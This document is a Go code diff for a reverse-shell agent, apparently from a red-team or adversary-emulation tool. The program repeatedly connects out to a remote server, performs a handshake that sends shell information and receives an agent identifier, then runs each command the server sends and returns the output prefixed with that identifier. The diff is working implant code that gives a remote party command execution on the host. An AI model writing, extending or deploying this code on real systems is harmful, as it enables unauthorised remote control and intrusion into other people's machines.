@@ -14,7 +14,7 @@ import (
    "./commands"
 )
 
-var shellInfo, httpServer string
+var shellInfo, httpServer, paw string
 
 func runNextCommand(message string) []byte {
    if strings.HasPrefix(message, "cd") {
@@ -35,21 +35,25 @@ func runNextCommand(message string) []byte {
    }
 }
 
-func listen(conn net.Conn) {
-   scanner := bufio.NewScanner(conn)
+func listen(conn net.Conn, paw []byte) {
+    scanner := bufio.NewScanner(conn)
     for scanner.Scan() {
        message := scanner.Text()
        bites := runNextCommand(strings.TrimSpace(message))
-       conn.Write(bites)
+       conn.Write(append(paw, bites...))
     }
 }
 
-func handshake(conn net.Conn) bool{
+func handshake(conn net.Conn) string {
     conn.Write([]byte(terminal_key))
     conn.Write([]byte("\n"))
     conn.Write([]byte(shellInfo))
     conn.Write([]byte("\n"))
-    return true
+    data := make([]byte, 512)
+    n, _ := conn.Read(data)
+    paw := string(data[:n])
+    conn.Write([]byte("\n"))
+    return strings.TrimSpace(string(paw))
 }
 
 func main() {
@@ -68,8 +72,9 @@ func main() {
       if err != nil {
          fmt.Println(err)
       } else {
-          handshake(conn)
-          listen(conn)
+          paw = handshake(conn)
+          fmt.Println(fmt.Sprintf("reverse-shell established for %s", paw))
+          listen(conn, []byte(fmt.Sprintf("%s$", paw)))
       }
       time.Sleep(5 * time.Second)
    }
